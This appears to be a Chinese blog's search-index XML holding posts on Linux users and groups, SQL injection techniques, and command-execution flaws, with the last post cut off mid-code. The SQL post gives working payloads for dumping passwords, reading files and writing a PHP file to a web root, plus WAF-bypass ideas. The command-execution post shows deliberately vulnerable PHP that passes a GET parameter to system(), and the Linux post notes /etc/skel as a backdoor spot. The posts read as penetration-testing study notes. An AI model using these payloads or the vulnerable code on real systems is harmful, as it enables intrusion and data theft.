<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux用户和组</title>
    <link href="/2022/10/22/linux-yong-hu-he-zu/"/>
    <url>/2022/10/22/linux-yong-hu-he-zu/</url>
    
    <content type="html"><![CDATA[<h1 id="linux用户和组"><a href="#linux用户和组" class="headerlink" title="linux用户和组"></a>linux用户和组</h1><h2 id="一-Linux用户分类"><a href="#一-Linux用户分类" class="headerlink" title="一.Linux用户分类"></a>一.Linux用户分类</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">1、root用户:权限最高.</span><br>操作其他用户的文件，控制可执行程序管理硬件设备，管理文件权限<br><br><span class="hljs-section">2、系统用户:虚拟用户、伪用户或者假用户。</span><br>这类用户不能登录Linux系统。<br>系统进程运行身份。<br>系统用户:<br>ID为1-999，（CentOS7之前为1-499）<br><br><span class="hljs-section">3、普通用户:</span><br>root用户创建，能够使用大部分资源，一些特定权限受限。<br>ID为1000-65535<br></code></pre></td></tr></table></figure><h2 id="二-Linux用户登录过程"><a href="#二-Linux用户登录过程" class="headerlink" title="二.Linux用户登录过程"></a>二.Linux用户登录过程</h2><p>1./etc/passwd</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br>账户<span class="hljs-symbol">:</span>密码占位符<span class="hljs-symbol">:UID</span><span class="hljs-symbol">:GID</span><span class="hljs-symbol">:</span>账户信息<span class="hljs-symbol">:</span>家目录<span class="hljs-symbol">:</span>登录shell<br></code></pre></td></tr></table></figure><p>家目录:存放用户自己的数据</p><p>2./etc/shadow</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$sVI78ZA4$QQ9jzXKyhjEpsjz6I5lsPAQcNNamPxivy25rnhK1UZ/<span class="hljs-number">1</span>kv07qUrOlN2ZalIpAZwowkEHlk5/<span class="hljs-number">40</span>wPZ8uDioAi41:<span class="hljs-number">17995</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure><ul><li><p>第1个字段：用户名</p></li><li><p>第2个字段：加密密码，加密算法是SHA512加密算法，如果是“！！”“*”代表没有密码，不能登录</p></li><li><p>第3个字段：密码最后一次修改日期，我们看到root的这个字段是17995，这个是使用1970年1月1日作为标准时间，每过一天，时间戳+1</p></li><li><p>第4个字段：两次密码的修改间隔时间（和第3个字段相比），就是说多少天后可以修改这个密码，我们看到root用户的这个字段是0</p></li><li><p>第5个字段：密码有效期（和第3个字段相比），我们看到root用户的这个字段是99999，基本上是永久有效</p></li><li><p>第6个字段：密码到期前的警告天数（和第5个字段相比），也就说比如我们在第5个字段设置了一个密码有效期，比如10天，然后我们这个字段设置是7，那么就是还剩7天到期的时候，就会有警告了。</p></li><li><p>第7个字段：密码过期后的宽限天数（和第5个字段相比）<br>0代表密码过期后立即失效，-1代表永远不会失效</p></li><li><p>第8个字段：账号失效的时间（要用时间戳表示），如果这个字段设置了失效时间，前面设置的有效期就没用了。</p></li><li><p>第9个字段：保留</p></li></ul><p>3./etc/group</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">root:x:0:</span><br><span class="hljs-section">用户组名称:用户组密码:GID:用户列表</span><br></code></pre></td></tr></table></figure><h2 id="三-Linux用户管理命令"><a href="#三-Linux用户管理命令" class="headerlink" title="三.Linux用户管理命令"></a>三.Linux用户管理命令</h2><p>1.添加用户</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">useradd  <span class="hljs-selector-attr">[参数]</span> <span class="hljs-selector-attr">[name]</span><br></code></pre></td></tr></table></figure><p>参数:</p><ul><li><p>-u UID    #指定 UID，这个 UID 必须是大于等于500，并没有其他用户占用的 UID </p></li><li><p>-g GID/GROUPNAME    #指定默认组，可以是 GID 或者 GROUPNAME，同样也必须真实存在 </p></li><li><p>-G GROUPS    #指定额外组 </p></li><li><p>-c COMMENT    #指定用户的注释信息 </p></li><li><p>-d PATH    #指定用户的家目录 </p></li><li><p>-s SHELL    #指定用户的默认 shell，最好是在 /etc/shells 中存在的路径 </p></li><li><p>-s /sbin/nologin    #该用户不能登录，还记得我们上面说到的系统用户不能登录吧？我们可以看到系统用户的 shell 字段也是 /sbin/nologin </p></li><li><p>echo $SHELL     #查看当前用户的 shell 类型 </p></li><li><p>-M  USERNAME    #创建用户但不创建家目录 </p><p>如果用户没有家目录，那么不能切换到该用户 </p></li></ul><p>2.删除用户</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">userdel <span class="hljs-selector-attr">[参数]</span> <span class="hljs-selector-attr">[name]</span><br></code></pre></td></tr></table></figure><p>参数:</p><p>​     -r     #删除用户的同时删除用户家目录</p><p>3.显示账户属性信息</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">id <span class="hljs-selector-attr">[参数]</span> <span class="hljs-selector-attr">[name]</span><br></code></pre></td></tr></table></figure><p>参数:</p><ul><li>id -g USERNAME：显示默认组ID </li><li>id -G USERNAME：显示附加组ID</li><li>id -u USERNAME：显示UID </li><li>id -n -g/-G/-U：显示默认组/附加组/用户的名称 </li></ul><p>4.修改用户信息</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">usermod <span class="hljs-selector-attr">[参数]</span> <span class="hljs-selector-attr">[name]</span><br></code></pre></td></tr></table></figure><p>参数:</p><p> -G GROUPS ：改变用户的附加组，会完全替换原有的附加组 </p><p> -a -G GROUPS ：在原有附加组的基础上追加附加组 </p><p> -d PATH ：修改家目录。修改后原先家目录中的文件不能访问了，因为在当前的家目录中并不存在这些文件。 </p><p> -l NEWNAME ：改变用户名</p><p>-L    #锁定用户  检查是否配置成功,xshell连接不成功</p><p>-U    #解锁用户</p><p>5.passwd</p><p>参数:</p><p>-l：锁定用户账号（root only）<br>        -u：解锁用户账号（root only）<br>        -d：删除用户密码。用户密码删除后不能登录。</p><p>6.添加组</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">groupadd <span class="hljs-selector-attr">[参数]</span> <span class="hljs-selector-attr">[name]</span><br></code></pre></td></tr></table></figure><p>参数:</p><p>-g GID GROUPNAME：指定GID</p><p>-r  GROUPNAME：添加一个系统用户组（-r 也适用于 useradd）</p><p>7.删除组</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">groupdel</span><span class="hljs-meta"> [name]</span><br></code></pre></td></tr></table></figure><p>8.给组加密码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gpasswd</span><span class="hljs-meta"> [name]</span><br></code></pre></td></tr></table></figure><p>9.显示当前用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>10.查看登录用户正在使用的进程信息</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">w</span><br></code></pre></td></tr></table></figure><p>11.用于不同用户间的切换</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">su</span><br></code></pre></td></tr></table></figure><p>参数:</p><p>-l 登录并改变到所切换到的用户环境</p><p>-c 执行一个命令然后退出所切换到的用户环境</p><p>su 默认切换到root</p><h2 id="四-etc-skel目录🐱‍🐉🐱‍🐉🐱‍🐉"><a href="#四-etc-skel目录🐱‍🐉🐱‍🐉🐱‍🐉" class="headerlink" title="四./etc/skel目录🐱‍🐉🐱‍🐉🐱‍🐉"></a>四./etc/skel目录🐱‍🐉🐱‍🐉🐱‍🐉</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>skel 目录(可以隐藏后门,只要创建用户就会留有后门)<br></code></pre></td></tr></table></figure><p>/etc/skel目录是用来存放新用户环境变量文件的目录，当我们添加新用户时，这个目录下的所有文件会自动被复制到新添加的用户的家目录下：<br>默认情况下，/etc/skel目录下的所有文件都是隐藏文件（以.点开头的文件）；通过修改，添加，删除/etc/skel目录下的文件，我们可为新创建<br>的用户提供统一的，标准的，初始化用户环境。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入基础</title>
    <link href="/2022/10/20/sql-zhu-ru/"/>
    <url>/2022/10/20/sql-zhu-ru/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h4 id="SQL注入概念"><a href="#SQL注入概念" class="headerlink" title="SQL注入概念"></a>SQL注入概念</h4><p>SQL注入就是将构造好的SQL语句插入或者添加到输入参数中进行攻击,利用这个SQL语句执行程序意料之外的结果</p><h4 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h4><ol><li>联合注入</li><li>报错注入</li><li>时间注入</li><li>布尔注入</li><li>宽字节注入</li><li>二次注入</li><li>堆叠注入</li></ol><h4 id="注入点可能存在的地方"><a href="#注入点可能存在的地方" class="headerlink" title="注入点可能存在的地方"></a>注入点可能存在的地方</h4><ol><li> and 1=1  / and 1=2</li><li>引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不正常</li><li>+1  /  -1 </li><li>and sleep(5) 判断页面返回时间</li></ol><h4 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h4><p>1)读文件—-load_file()</p><p>目录路径可以使用十六进制编码</p><p>示例:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.sqli.com/Less-<span class="hljs-number">2</span>/?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(load_file(&#x27;E:/phpStudy/WWW/<span class="hljs-number">1</span>.txt&#x27;)) --+<br></code></pre></td></tr></table></figure><p>2)写文件—-into outfile()</p><p>写入的内容可以进行十六进制的编码,而目录路径不可以进行编码</p><p>示例:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://www.sqli.com/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> OUTFIL<span class="hljs-string">E&#x27;C:/phpStudy/WWW/5.php&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>上述两个函数利用的先决条件 </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> secure<span class="hljs-emphasis">_file_</span>priv=不可为null<br><span class="hljs-bullet">2.</span> 拥有读写文件的权限<br><span class="hljs-bullet">3.</span> 必须知道文件的路径<br><span class="hljs-bullet">4.</span> 写的命令必须全局未开启GPC<br><span class="hljs-bullet">5.</span> 拥有root权限<br></code></pre></td></tr></table></figure><p>3)不满足先决条件的情况</p><p>①dumpfile以二进制的方式写入</p><p>②使用全局日志写入</p><p>③使用慢日志写入</p><h4 id="SQL注入详解"><a href="#SQL注入详解" class="headerlink" title="SQL注入详解"></a>SQL注入详解</h4><p><strong>联合注入</strong></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">利用前提:页面上有显示位<br>优点:方便/快捷/易于利用<br>缺点:需要显示位<br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> /<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>    判断列数<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>   使用联合注入<br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(user()),<span class="hljs-number">3</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> security.users<br>....各种拼接语句<br></code></pre></td></tr></table></figure><p>MySQL中的union规则</p><p>①union必须有两条或两条以上的select语句组成，语句之间用关键union分隔</p><p>②union中的每个查询必须包含相同的列数</p><p>③union会从查询结果集中自动去除了重复行</p><p>④只有最后一个select子句允许有order by</p><p>⑤只有最后一个select子句允许有limit</p><p><strong>报错注入</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">特征:页面上有没有显示位无所谓,但是需要输出SQL语句执行错误信息,比如,mysqli_error()</span><br><span class="hljs-section">优点:不需要显示位</span><br><span class="hljs-section">缺点:需要输出mysqli_error()的报错信息</span><br></code></pre></td></tr></table></figure><p>常用函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--xpath语法错误</span><br>extractvalue()<span class="hljs-comment">--查询节点内容</span><br>updatexml()<span class="hljs-comment">--修改查询到的内容</span><br>它们的第二个参数都要求是符合xpath语法的字符串<br>如果不满足要求则会报错，并且将查询结果放在报错信息里<br><br><span class="hljs-comment">--主键重复（duplicate entry）</span><br><span class="hljs-built_in">floor</span>()<span class="hljs-comment">--返回小于等于该值的最大整数</span><br>只要是count，rand()，<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> 三个连用就会造成这种主键重复报错<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span><span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> version())))x <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x;<br><span class="hljs-keyword">and</span> ( <span class="hljs-keyword">Select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((<span class="hljs-keyword">user</span>()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))) <br><span class="hljs-number">2.</span>extractvalue<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,(concat(<span class="hljs-number">0x7e</span>,(database()),<span class="hljs-number">0x7e</span>)))<br><span class="hljs-number">3.</span>updatexml<br><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, (concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><strong>时间注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">页面没有显示位,也没有输出<span class="hljs-keyword">SQL</span>语句执行错误信息<br>正确的<span class="hljs-keyword">SQL</span>语句和错误的<span class="hljs-keyword">SQL</span>语句返回页面都一样,但是加入sleep(<span class="hljs-number">5</span>)后,页面的返回速度明细慢了<span class="hljs-number">5</span>秒<br>优点:不需要显示位,不需要出错信息<br>缺点:速度慢,耗费大量时间<br><br>示例:<br>if (ascii(substr(payload, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><strong>布尔注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">利用前提:没有显示位也没有输出<span class="hljs-keyword">SQL</span>语句执行错误信息,只能通过页面返回正常不正常<br>优点:不需要显示位,不需要出错信息<br>缺点:速度慢,耗费大量时间<br><br>示例:<br>  <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-comment">---payload</span><br>  ascii(substr(<span class="hljs-string">&#x27;payload&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">65</span><br></code></pre></td></tr></table></figure><p>常用函数:</p><p>exists(sql)  ———–( in )类似于子查询.看sql语句查询的值是否存在,存在返回true</p><p>ascii(str)    ———- a-&gt;97  A-&gt;65 字符转化为ASCII      范围65-90,97-122</p><p>HEX((STR))  —————-进行hex十六进制编码</p><p>substr(str,start,len)    ———-截取字符串(要前也要后)</p><p>ord()  ———-类似ASCII  只转第一个字符</p><p>mid() ————类似substr</p><p>length() ————–取长度</p><p>left(str,end) —————从左边开始取</p><p>regexp()  —————–类似于like(selec * from user where username regexp ‘Dumb’)</p><p>like()     ——————类似于regexp</p><p><strong>宽字节注入</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">在数据库中使用了宽字符集(GBK，GB<span class="hljs-number">2312</span>等)，除了英文都是一个字符占两字节；<br>MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii&gt;<span class="hljs-number">128</span>才能达到汉字范围)；<br>在PHP中使用addslashes函数的时候，会对单引号<span class="hljs-variable">%27</span>进行转义，在前边加一个反斜杠”\”，变成<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><span class="hljs-comment">;</span><br>可以在前边添加<span class="hljs-variable">%df</span><span class="hljs-punctuation">,</span>形成<span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span>，而数据进入数据库中时前边的<span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>两字节会被当成一个汉字<span class="hljs-comment">;</span><br><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>被吃掉了，单引号由此逃逸可以用来闭合语句。<br></code></pre></td></tr></table></figure><p><strong>二次注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。<br><br><br>例如:<br>第一步:<br>输入   admin\<span class="hljs-string">&#x27;#        </span><br><span class="hljs-string">进入到数据库中存储变成 admin&#x27;</span>#<br><br>第二步:<br>当数据进行修改或者更新的时候,从数据库中取出用户 admin<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">在SQL语句中会变成 admin\&#x27;</span>#    进而间接修改或者更新了 admin 的数据<br></code></pre></td></tr></table></figure><p><strong>堆叠注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">堆叠注入本质上就是<span class="hljs-keyword">SQL</span>语句的拼接,每句<span class="hljs-keyword">SQL</span>语句结束之后用分号结尾,再拼接下一条<span class="hljs-keyword">SQL</span>语句实现堆叠注入<br><br>示例:<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span>;......<br></code></pre></td></tr></table></figure><h4 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h4><p>1.预处理(PDO)+数据绑定。</p><p>2.字符型使用函数addslashes()</p><p>3.整型使用函数intval()</p><p>4.正则匹配进行转义</p><h4 id="SQL注入绕waf思路"><a href="#SQL注入绕waf思路" class="headerlink" title="SQL注入绕waf思路"></a>SQL注入绕waf思路</h4><p>1.软件型waf,例如安全狗、云锁、D盾等</p><p>​        1)双写/大小写</p><p>​        2)内联注释</p><p>​        3)垃圾字符填充</p><p>​        4)换行或者截断</p><p>2.云waf,例如腾讯云、华为云、玄武盾等</p><p>绕过云waf原理就是找到服务器真实的IP地址,将其绑定到本地的hosts文件中即可</p><p>​        1)全球ping</p><p>​        2)历史解析记录</p><p>​        3)DDOS</p><p>3.代码型waf</p><p>​    白盒审计,绕过正则匹配</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test22</title>
    <link href="/2022/10/20/test22/"/>
    <url>/2022/10/20/test22/</url>
    
    <content type="html"><![CDATA[<p>c</p><p>index_img: <img src="image-20221020094613383.png"></p><p>测试图片上传1111</p><p><img src="image-20221020094440688.png"></p><p>!!!!!!!!!!!!!!!本地绝对路径!!!!!!!!!!!!!!!</p><p>one</p><p><img src="image-20221020094440688.png"></p><p>two</p><p><img src="image-20221020094536333.png"></p><p>three</p><p><img src="image-20221020094550791.png" alt="alt"></p><p>four</p><p><img src="image-20221020094605774.png" alt="alt"></p><p>five</p><p><img src="image-20221020094613383.png" alt="alt"></p><p>啊啊啊啊啊!!!!!!</p><p>希望可以上传成功</p>]]></content>
    
    
    
    <tags>
      
      <tag>基础知识储备</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>任意命令执行</title>
    <link href="/2022/10/18/ren-yi-ming-ling-zhi-xing/"/>
    <url>/2022/10/18/ren-yi-ming-ling-zhi-xing/</url>
    
    <content type="html"><![CDATA[<h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><h4 id="命令执行漏洞的概述"><a href="#命令执行漏洞的概述" class="headerlink" title="命令执行漏洞的概述"></a>命令执行漏洞的概述</h4><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。<br>!!!当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。!!!<br></code></pre></td></tr></table></figure><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。<br></code></pre></td></tr></table></figure><h6 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h6><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(args) 有回显<br>passthru(args)(有回显)<br><span class="hljs-keyword">exec</span>(args,$arr)  （回显最后一行-必须echo输出,也可以传递数组显示出来）<br>shell_exec(args) （无回显-必须输出）<br>反引号：<span class="hljs-string">``</span> <br><span class="hljs-keyword">popen</span>(handle,mode)(无回显) ,打开是资源需配合<span class="hljs-keyword">fread</span>读或fget读 <br>proc_open(<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)（无回显）<br>$process = proc_open(<span class="hljs-string">&#x27;dir&#x27;</span>,$des,$pipes);<br>echo stream_get_contents($pipes[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><h6 id="System-函数漏洞利用-1-——整个控制"><a href="#System-函数漏洞利用-1-——整个控制" class="headerlink" title="System()函数漏洞利用(1) ——整个控制"></a>System()函数漏洞利用(1) ——整个控制</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$arg</span>)&#123;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$arg</span>&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>/?cmd=id<br>/?cmd=pwd<br>/?cmd=ifconfig<br></code></pre></td></tr></table></figure><h6 id="System-函数漏洞利用-2-——-ping"><a href="#System-函数漏洞利用-2-——-ping" class="headerlink" title="System()函数漏洞利用(2)——-ping"></a>System()函数漏洞利用(2)——-ping</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$arg</span>) 